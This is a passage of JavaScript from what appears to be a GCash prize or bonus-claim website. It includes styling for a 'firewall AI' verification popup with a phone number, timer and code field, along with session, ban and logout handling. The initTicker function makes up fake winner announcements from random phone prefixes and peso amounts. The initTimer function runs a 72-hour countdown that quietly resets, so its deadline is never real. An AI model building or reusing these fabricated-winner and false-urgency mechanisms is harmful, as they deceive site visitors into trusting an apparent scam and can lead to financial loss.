            // --- BAGONG CSS PARA SA 3D FRUITS THEME ---
            '@keyframes firewallShake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } 60% { transform: translateX(-5px); } 80% { transform: translateX(5px); } }' +
            '@keyframes firewallPopIn { 0% { transform: scale(0.5) rotate(-5deg); opacity: 0; } 60% { transform: scale(1.05) rotate(2deg); } 100% { transform: scale(1) rotate(0deg); opacity: 1; } }' +
            '@keyframes fruitFloat { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-10px) rotate(10deg); } }' +
            '.firewall-ai-overlay { position: fixed; inset: 0; background: radial-gradient(circle at 50% 35%, rgba(255,255,255,0.3) 0%, rgba(90, 24, 154, 0.9) 60%, rgba(16, 0, 43, 1) 100%); z-index: 999999; display: flex; align-items: center; justify-content: center; padding: 16px; opacity: 0; transition: opacity 0.3s ease; }' +
            '.firewall-ai-overlay.show { opacity: 1; }' +
            '.firewall-ai-container { position: relative; width: 100%; max-width: 400px; background: linear-gradient(180deg, rgba(255,255,255,0.15) 0%, transparent 30%), linear-gradient(145deg, #ff2d95 0%, #b537f2 50%, #5a189a 100%); border: 4px solid #ffd700; border-radius: 28px; padding: 26px 20px 22px; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 215, 0, 0.6); animation: firewallPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); overflow: hidden; box-sizing: border-box; }' +
            '.firewall-ai-close { position: absolute; top: 14px; right: 16px; width: 36px; height: 36px; background: rgba(255, 255, 255, 0.2); border: 2px solid #ffd700; border-radius: 50%; color: #ffd700; font-size: 16px; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.25s ease; z-index: 10; }' +
            '.firewall-ai-close:hover { background: rgba(255, 68, 68, 0.5); color: #fff; transform: rotate(90deg) scale(1.1); }' +
            '.firewall-ai-header { text-align: center; margin-bottom: 16px; }' +
            '.firewall-ai-icon { width: 80px; height: 80px; margin: 0 auto 12px; background: linear-gradient(145deg, #ffeb3b, #ff9800); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 3px solid #fff9c4; box-shadow: 0 0 30px rgba(255, 215, 0, 0.8); font-size: 40px; animation: fruitFloat 3s ease-in-out infinite; }' +
            '.firewall-ai-title { font-family: "Fredoka", sans-serif; font-size: 24px; font-weight: 900; background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ffeb3b 50%, #ff9800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 2px; text-transform: uppercase; margin: 0 0 4px 0; filter: drop-shadow(0 0 10px rgba(255,215,0,0.8)); }' +
            '.firewall-ai-subtitle { font-family: "Poppins", sans-serif; font-size: 10px; color: rgba(255, 255, 255, 0.9); letter-spacing: 3px; text-transform: uppercase; font-weight: 700; }' +
            '.firewall-ai-divider { width: 70px; height: 3px; background: linear-gradient(90deg, transparent, #ffd700, #ff2d95, #ffd700, transparent); margin: 14px auto; border-radius: 2px; }' +
            '.firewall-ai-status { background: rgba(0,0,0,0.4); border: 2px solid #ffd700; border-radius: 18px; padding: 16px; margin: 14px 0; text-align: center; box-shadow: inset 0 0 20px rgba(255,215,0,0.2); }' +
            '.firewall-ai-status-text { font-family: "Poppins", sans-serif; font-size: 13px; color: #fff; line-height: 1.5; }' +
            '.firewall-ai-status-text strong { color: #00f2ff; text-shadow: 0 0 12px rgba(0, 242, 255, 0.8); font-weight: 800; }' +
            '.firewall-ai-phone-number { font-family: "Orbitron", monospace; font-size: 24px; font-weight: 900; color: #ffd700; letter-spacing: 2px; margin: 10px 0; text-shadow: 0 0 15px rgba(255,215,0,0.6); }' +
            '.firewall-ai-timer { font-family: "Orbitron", monospace; font-size: 34px; font-weight: 900; color: #39ff14; text-shadow: 0 0 20px rgba(57, 255, 20, 0.8); letter-spacing: 3px; margin: 8px 0; }' +
            '.firewall-ai-timer.urgent { color: #ff1744; text-shadow: 0 0 20px rgba(255, 23, 68, 0.9); }' +
            '.firewall-ai-btn-primary { width: 100%; padding: 16px 20px; background: linear-gradient(180deg, #ffeb3b 0%, #ffd700 40%, #ff9800 100%); border: 3px solid #fff9c4; border-radius: 14px; font-family: "Fredoka", sans-serif; font-size: 15px; font-weight: 900; color: #5A2A00; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; letter-spacing: 1.5px; text-transform: uppercase; box-shadow: 0 5px 0 #8b4500, 0 8px 20px rgba(0, 0, 0, 0.5); transition: all 0.1s ease; }' +
            '.firewall-ai-btn-primary:active { transform: translateY(5px); box-shadow: 0 0 0 #8b4500; }' +
            '.firewall-ai-btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }' +
            '.firewall-ai-code-section { display: none; margin-top: 14px; }' +
            '.firewall-ai-code-section.show { display: block; }' +
            '.firewall-ai-code-label { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; font-family: "Fredoka", sans-serif; font-size: 11px; color: #fff; letter-spacing: 1.5px; text-transform: uppercase; font-weight: 700; }' +
            '.firewall-ai-input { width: 100%; max-width: 200px; margin: 0 auto 12px; display: block; text-align: center; font-family: "Orbitron", monospace; font-size: 28px; font-weight: 900; padding: 14px; background: #1a0b2e; border: 3px solid #ffd700; border-radius: 14px; color: #ffd700; letter-spacing: 8px; outline: none; box-shadow: 0 0 15px rgba(255, 215, 0, 0.5); box-sizing: border-box; }' +
            '.firewall-ai-btn-verify { width: 100%; padding: 14px 20px; background: linear-gradient(180deg, #00ff88 0%, #00cc44 50%, #008833 100%); border: 3px solid #7dffb3; border-radius: 12px; font-family: "Fredoka", sans-serif; font-size: 15px; font-weight: 900; color: #00331a; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; letter-spacing: 1.5px; text-transform: uppercase; box-shadow: 0 5px 0 #005522, 0 8px 20px rgba(0, 0, 0, 0.5); }' +
            '.firewall-ai-btn-verify:active { transform: translateY(5px); box-shadow: 0 0 0 #005522; }' +
            '.firewall-ai-msg-error { display: none; color: #ff4466; text-align: center; padding: 10px; margin-top: 10px; background: rgba(255, 68, 102, 0.2); border: 2px solid rgba(255, 68, 102, 0.5); border-radius: 12px; font-size: 11px; font-weight: 600; }' +
            '.firewall-ai-msg-error.show { display: block; }' +
            '.firewall-ai-msg-expired { display: none; color: #ff9800; text-align: center; padding: 10px; margin-top: 10px; background: rgba(255, 152, 0, 0.2); border: 2px solid rgba(255, 152, 0, 0.5); border-radius: 12px; font-size: 11px; font-weight: 600; }' +
            '.firewall-ai-msg-expired.show { display: block; }' +
            '.firewall-ai-btn-back { background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.3); border-radius: 10px; padding: 10px 20px; font-family: "Fredoka", sans-serif; font-size: 12px; font-weight: 700; color: #fff; cursor: pointer; letter-spacing: 1px; text-transform: uppercase; transition: all 0.2s; }' +
            '.firewall-ai-btn-back:hover { background: rgba(255,255,255,0.2); }' +
            '@media (max-width: 480px) { .firewall-ai-container { padding: 22px 16px 18px; border-radius: 24px; } .firewall-ai-title { font-size: 20px; } .firewall-ai-icon { width: 65px; height: 65px; font-size: 32px; } .firewall-ai-phone-number { font-size: 20px; } .firewall-ai-timer { font-size: 28px; } .firewall-ai-input { font-size: 24px; padding: 12px; letter-spacing: 6px; } }';
        document.head.appendChild(style);
    }

    // ============================================================
    // TIMER & TICKER
    // ============================================================
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }

            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                displayElement.textContent = days + 'D ' + hours.toString().padStart(2, '0') + ':' + minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
            }
            update();
            setInterval(update, 1000);
        } catch(e) {}
    }

    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        var amountRarity = [ { amount: 500, weight: 85 }, { amount: 1000, weight: 10 }, { amount: 2000, weight: 3 }, { amount: 2500, weight: 2 } ];
        var actions = ["received", "received", "withdraw"];

        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) return amountRarity[i].amount;
            }
            return 500;
        }

        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            var action = actions[Math.floor(Math.random() * actions.length)];
            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action + ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount.toLocaleString();
        }
        updateTicker();
        setInterval(updateTicker, 8000);
    }

    // ============================================================
    // CONFETTI CANVAS
    // ============================================================
    var confettiCanvas = null;
    var confettiAnimation = null;

    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
        if (SKIP_HEAVY_EFFECTS && confettiCanvas) confettiCanvas.style.display = 'none';
    }

    function startConfetti() {
        if (!confettiCanvas || SKIP_HEAVY_EFFECTS) return;
        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
        var ctx = confettiCanvas.getContext('2d');
        var particles = [];
        for (var i = 0; i < 50; i++) {
            particles.push({ x: Math.random() * confettiCanvas.width, y: Math.random() * confettiCanvas.height - confettiCanvas.height, size: Math.random() * 6 + 3, color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)', speed: Math.random() * 3 + 2, rotation: Math.random() * 360, rotationSpeed: (Math.random() - 0.5) * 5 });
        }
        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.setTransform(1, 0, 0, 1, p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                p.y += p.speed; p.rotation += p.rotationSpeed;
                if (p.y > confettiCanvas.height) { p.y = -p.size; p.x = Math.random() * confettiCanvas.width; }
            }
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            confettiAnimation = requestAnimationFrame(draw);
        }
        draw();
        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 2500);
    }

    // ============================================================
    // BUTTON EVENTS & LOGOUT
    // ============================================================
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) logoutBtn.addEventListener('click', logoutUser);
        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) fbBtn.addEventListener('click', shareOnFacebook);
    }

    async function logoutUser() {
        if (userPhone && db) {
            try { await db.ref('user_sessions/' + userPhone).update({ status: 'offline', lastSeen: firebase.database.ServerValue.TIMESTAMP }); } catch(e) {}
        }
        localStorage.clear(); sessionStorage.clear();
        window.location.replace('index.html');
    }

    function shareOnFacebook() {
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent('https://tiny.cc/LuckyDrop'), '_blank', 'width=600,height=400');
    }

    // ============================================================
    // BAN CHECK
    // ============================================================
    function checkIfBanned() {
        if (!userPhone || !db) return;
        db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
            if (snap.exists()) {
                db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                localStorage.clear(); sessionStorage.clear();
                window.location.replace('index.html');
            }
        });
    }

    // ============================================================
    // ADMIN FORCE LOGOUT
    // ============================================================
    function initAdminForceLogoutListener() {
        if (!userPhone || !db) return;
        var cleanPhone = userPhone.replace(/[^0-9]/g, '');
        userRef.child('forceLogout').once('value').then(function(flagSnap) {
            if (flagSnap.val() === true) { showForceLogoutPopup(); return; }
            return userRef.update({ status: 'online', lastSeen: firebase.database.ServerValue.TIMESTAMP }).then(function() {
                setTimeout(function() { setupAdminLogoutListener(cleanPhone); }, 2000);
            });
        });
    }

    function setupAdminLogoutListener(cleanPhone) {
        if (listenersSetup) return;
        listenersSetup = true;
        forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
        forceLogoutFlagListener.on('value', function(snapshot) {
            if (snapshot.val() === true && !logoutTriggered) {
                logoutTriggered = true;
                forceLogoutFlagListener.off();
                showForceLogoutPopup();
            }
        });
    }

    function showForceLogoutPopup() {
        if (document.querySelector('.force-logout-popup')) return;
        addForceLogoutAnimations();
        var overlay = document.createElement('div');
        overlay.className = 'force-logout-popup carnival-overlay';
        // ... (force logout popup content - same as before)
        overlay.innerHTML = '<div class="carnival-card"><h2 class="carnival-title">SESSION ENDED</h2><p class="carnival-message">Your session has been ended by an admin.</p><button onclick="localStorage.clear();window.location.href=\'index.html\'" class="carnival-btn">RETURN TO HOME</button></div>';
        document.body.appendChild(overlay);
    }

    function addForceLogoutAnimations() {
        // ... (Same force logout animation CSS as before)
    }

    // ============================================================
    // EXPORT
    // ============================================================
    window.PlayBonus = {
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; },
        openClaimNowPopup: openClaimNowPopup,
        closeClaimNowPopup: closeClaimNowPopup,
        handleClaimViaGCash: handleClaimViaGCash,
        showAdsPopup: showAdsPopup,
        closeAdsPopup: closeAdsPopup,
        forceShowBonusPopup: forceShowBonusPopup,
        startAdsCountdown: startAdsCountdown,
        stopAdsCountdown: stopAdsCountdown
    };

    // ============================================================
    // START
    // ============================================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 30000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 30000);
        checkIfBanned();
    }

})();
